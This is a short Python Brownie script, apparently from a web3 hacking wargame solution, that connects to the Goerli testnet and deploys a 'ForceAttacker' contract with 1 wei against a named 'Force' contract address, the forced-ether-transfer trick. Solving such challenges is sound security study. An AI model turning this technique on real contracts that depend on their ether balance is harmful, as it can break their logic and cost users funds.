import brownie

from web3_hacking import config


def main():
    force_contract_address = "0x82AE1cd7111336f2CdF5598E9261771db7A04bdd"

    brownie.network.disconnect()
    brownie.network.connect("goerli")

    brownie.accounts.add(config.ETH_ACCOUNT_PRIVATE_KEY)

    brownie.ForceAttacker.deploy(
        force_contract_address, {"from": brownie.accounts[0], "value": 1}
    )
